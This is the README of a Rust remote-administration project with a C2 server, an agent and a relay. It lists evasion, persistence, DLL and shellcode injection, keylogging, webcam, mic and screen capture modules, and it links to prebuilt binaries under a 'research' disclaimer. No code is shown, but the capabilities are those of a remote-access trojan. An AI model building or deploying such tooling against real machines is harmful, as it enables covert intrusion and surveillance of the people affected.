# Rust Remote Admin

Research/educational Rust workspace implementing authenticated remote-administration primitives — mTLS sessions, agent connection management, process/file/registry collection, remote command execution, and platform-specific hardening research modules.

All sensitive capabilities (injection, keylogging, capture, persistence, anti-analysis) are documented research examples with platform-specific implementations behind `#[cfg()]` attributes.

## Binaries

Three standalone executables with zero external dependencies — run on a clean Windows or Linux system without installing anything:

| Binary | Purpose |
|--------|---------|
| `rust-remote-admin-agent.exe` / `.bin` | Connects to C2, sends heartbeats, receives commands |
| `rust-remote-admin-c2.exe` / `.bin` | Listens for agent connections, queues commands, tracks health |
| `rust-remote-admin-relay.exe` / `.bin` | TCP relay between agents and C2 (cleartext or TLS modes) |

Download from [GitHub Releases](https://github.com/riceharvest/rust-remote-admin/releases).

## Crates

| Crate | Role |
|-------|------|
| `c2/core` | Client registry, per-client command queues, mTLS listener, heartbeat health tracking |
| `c2/gui` | Tauri v2 dashboard (client list, logs, live events) |
| `c2/plugins` | Operator-side plugin trait with echo example |
| `c2/relay` | Tokio TCP relay — cleartext, TLS-ingress, TLS-egress |
| `agent/core` | Command routing, heartbeat loop, exponential-backoff reconnect, mTLS/TLS/plain modes |
| `agent/modules` | Process listing/kill, file I/O, registry, sysinfo, remote command execution |
| `agent/hardening` | Anti-analysis, persistence, DLL injection, keylogging, webcam/mic, desktop capture |
| `protocol` | Shared command/response types |
| `crypto` | AES-GCM payload encryption, mTLS session handling (cert loading, acceptor/connector builders, dev cert generation) |

## Platform implementations

| Module | Linux | Windows |
|--------|-------|---------|
| Anti-debug | ptrace TracerPid, timing checks | IsDebuggerPresent, NtQueryInformationProcess |
| VM detection | DMI vendor, CPU hypervisor flag, MAC OUI | Registry VM artifacts, CPU hypervisor flag |
| Sandbox detection | Low CPU/memory, analysis process names | Low CPU/memory, known sandbox binaries |
| Persistence | systemd user service, crontab, autostart entry | Registry Run keys (`reg add/delete`), scheduled tasks (`schtasks`) |
| DLL injection | ptrace + `/proc/<pid>/mem` shellcode + `dlopen` resolution | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` + `LoadLibraryW` |
| Keylogging | evdev `/dev/input/event*` with keycode mapping | `SetWindowsHookExW(WH_KEYBOARD_LL)` with thread-local buffer |
| Webcam/mic | V4L2 ioctl pipeline (QUERYCAP → S_FMT → REQBUFS → mmap → STREAMON → DQBUF), ALSA via `arecord` | Stub (requires Media Foundation/WASAPI crates) |
| Desktop capture | X11 via `x11rb` (get_image + BGR→RGB conversion) | Stub (requires DXGI/GDI crate) |
| String obfuscation | XOR-based compile-time string obfuscation | Same |

## Build

```sh
cargo check --workspace
cargo test --workspace     # 62+ tests
```

### Cross-compile Windows executables

```sh
rustup target add x86_64-pc-windows-gnu
sudo dnf install mingw64-gcc mingw64-winpthreads-static   # Fedora
cargo build --release --target x86_64-pc-windows-gnu
```

Produces standalone `.exe` files with `+crt-static` — no external DLLs required.

### GUI (Tauri v2)

```sh
sudo dnf install webkit2gtk4.1-devel   # Linux dev deps
cargo build -p c2-gui
```

## Security note

This project is for lawful, authorized research and administration only. The hardening modules document offensive techniques so defenders can understand and detect them. All platform-specific code is gated behind `#[cfg()]` and returns structured errors on unsupported platforms.

## License

MIT.
